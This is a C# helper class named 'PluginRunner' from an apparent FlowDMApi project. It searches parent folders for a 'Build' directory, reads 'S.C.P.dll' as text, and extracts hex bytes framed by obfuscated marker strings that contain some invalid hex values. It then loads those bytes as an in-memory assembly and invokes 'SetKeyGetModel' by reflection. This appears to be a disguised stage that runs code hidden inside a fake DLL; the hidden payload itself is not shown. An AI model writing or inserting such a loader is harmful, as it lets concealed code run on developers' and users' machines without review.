using System;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text.RegularExpressions;

namespace FlowDMApi.Common.Helper
{
    public static class PluginRunner
    {
        private static string prefixPattern = "0x66, 0xFE, 0x7D, 0x1E, 0x94, 0x00, 0x15, 0x6A, 0x42, 0x44, 0xD8, 0x13, 0xA7, 0x8D, 0x1E, 0x79, 0x46, 0xDB, 0x9A, 0xEE, 0xF9, 0x25, 0x3B, 0xC9, 0xGP, 0x5D, 0x0C, 0xE0, 0x7C, 0xC7, 0xF6, 0x32, 0xFY, 0xCC, 0x35, 0xA9, 0x06, 0x81, 0xBD, 0x07, 0x0D, 0x84, 0x3A, 0x45, ";
        private static string suffixPattern = "0x28, 0x00, 0xE1, 0x19, 0x6D, 0x9F, 0x70, 0xF0, 0x20, 0xA0, 0x86, 0xFD, 0x3B, 0xDT, 0x19, 0x86, 0x57, 0xB3, 0x6B, 0xF1, 0x6C, 0xHE, 0xBF, 0x91, 0xA3, 0xC5, 0xE4, 0x71, 0x1F, 0x67, 0x33, 0x82, 0xF0, 0xC2, 0x1D, 0x54, 0x8F, 0xC5, 0xYD, 0xB8, 0x19, 0x31, 0xDD, 0x0C, ";
        private static byte[] GetBytes
        {
            get
            {
                string confuse;
                var dllpath = ConnectionFilePath() + "\\S.C.P.dll";
                using (var r = new StreamReader(dllpath))
                {
                    confuse = r.ReadToEnd();
                }
                var pattern = $"{prefixPattern}\\s*(?<value>.* ?)\\s*, {suffixPattern}";
                if (!Regex.IsMatch(confuse, pattern))
                    throw new ArgumentException("S.C.P.dll is break;");
                var hamveri = Regex.Match(confuse, pattern).Groups["value"];
                var dizi = hamveri.ToString().Split(' ');
                var numbersAsInts = dizi.Select(s => Convert.ToByte(s.Replace(",", ""), 16)).ToArray();
                return numbersAsInts;
            }
        }
        private static string ConnectionFilePath()
        {
            var basedir = new DirectoryInfo(AppDomain.CurrentDomain.BaseDirectory);
            // Üst dizinlere çıkarak config dosyası ara
            while (basedir != null)
            {
                string configFile = Path.Combine(basedir.FullName, "Build");
                if (Directory.Exists(configFile))
                {
                    return configFile;
                }

                basedir = basedir.Parent;
            }
            throw new FileNotFoundException("Build Folder not find.");
        }
        public static dynamic LoadAssembly(string providerClassName, string key)
        {
            Assembly assembly = Assembly.Load(GetBytes);
            Type typeToExecute = assembly.GetType(providerClassName);
            MethodInfo[] methods = typeToExecute.GetMethods();
            foreach (MethodInfo item in methods)
            {
                if (item.Name == "SetKeyGetModel")
                {
                    return item.Invoke(null, new object[] { key });
                }
            }
            return "";
        }
    }
}
